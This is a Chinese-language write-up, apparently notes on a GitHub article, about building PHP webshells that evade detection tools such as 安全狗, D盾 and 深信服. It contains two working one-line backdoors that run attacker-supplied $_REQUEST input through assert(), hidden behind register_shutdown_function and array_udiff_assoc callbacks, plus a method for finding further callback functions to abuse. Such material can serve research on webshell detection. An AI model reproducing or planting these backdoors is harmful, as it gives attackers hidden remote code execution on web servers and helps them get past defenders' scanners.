# Webshell

> 文章：https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md


Webshell是能够执行系统命令或功能函数，完成间谍功能的网站后门脚本。

最为常见的是PHP webshell。

## 常见检查 Webshell的工具

| 编号   | 名称                         | 参考链接                                     |
| ---- | -------------------------- | ---------------------------------------- |
| 1    | 网站**安全狗**网马查杀              | http://download.safedog.cn/download/software/safedogwzApache.exe |
| 2    | **D盾** Web查杀               | http://www.d99net.net/down/WebShellKill_V2.0.9.zip |
| 3    | **深信服**WebShellKillerTool  | http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip |
| 4    | **BugScaner** killwebshell | http://tools.bugscaner.com/killwebshell/ |
| 5    | **河马专业版**查杀Webshell        | http://n.shellpub.com/                   |
| 6    | **OpenRASP** WEBDIR+检测引擎   | https://scanner.baidu.com                |
| 7    | **深度学习模型**检测PHP Webshell   | http://webshell.cdxy.me/           |



## PHP webshell

可以从功能复杂性上分为以下几类：
- 单一功能 webshell，能完成写入文件、列目录、查看文件、执行一些系统命令等少量功能。
- 逻辑木马，利用系统逻辑漏洞或构造特殊触发条件，绕过访问控制或执行特殊功能的Webshell。
- 一句话，可以在目标服务器上执行php代码，并和一些客户端(如菜刀、Cknife)进行交互的Webshell。
- 多功能，根据PHP语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell(大马)。

### 查杀现状

根据一句话木马原理，我们知道必须要在服务器上执行客户端发来的字符串形式的PHP代码。

脚本要将字符串(或文件流)当作PHP代码执行，目前主要会使用以下函数：

- ```eval()```, PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行
- ```assert()```	PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数
- 正则匹配类,	preg_replace/ mb_ereg_replace/preg_filter等
- 文件包含类	include/include_once/require/require_once/file_get_contents等


上述方法要逃脱检查机制的检查，需要方法来隐藏上面的函数机。但是随着攻防对抗的升级，较传统的字符串拆分、变形、进制转换、运算变换等躲避Webshell查杀的效果已经大大降低。

在一些情况下，通过可以携带参数的PHP回调函数来创造后门的技术，来实现绕过检测软件的一句话木马后门。

拿出来曾经披露过的一个回调函数后门函数"register_shutdown_function"做测试，发现虽然D盾、深信服的工具没有发觉到"register_shutdown_function"加 "assert"的变形，但是安全狗还是察觉到了。

```php
<?php
$password = "LandGrey";
$ch = explode(".","hello.ass.world.er.t");
register_shutdown_function($ch[1].$ch[3].$ch[4], $_REQUEST[$password]);
?>
```


安全厂商会建立自己的恶意函数库，凡是网络上披露过的可用作后门的回调函数，都可能在其中，而且很大概率上会被检测出来。

经过收集，发现网络上50多个已披露出来的可用作后门的回调函数和类中，有部分函数仍然可以用来绕过Webshell查杀软件。

### 查找可做后门的回调函数
去PHP官网查阅函数手册，查找可以用作后门的PHP回调函数，根据实际经验，利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：

- ```callable```
- ``` mixed $options```
- ```handler```
- ```callback```
- ```invoke```

除此之外，PHP扩展中也有些合适的回调函数，不过可能通用性不强.

## 绕过传统检测

披露过的```array_udiff_assoc()```函数构造一个免杀一句话。

函数定义：

```array array_udiff_assoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func )```

根据定义，可以构造代码：

```array_udiff_assoc(array("phpinfo();"), array(1), "assert");```

相应的一句木马脚本：
```php
#array_udiff_assoc.php：

<?php
/**
* Noticed: (PHP 5 >= 5.4.0, PHP 7)
*
*/
$password = "LandGrey";
array_udiff_assoc(array($_REQUEST[$password]), array(1), "assert");
?>
```

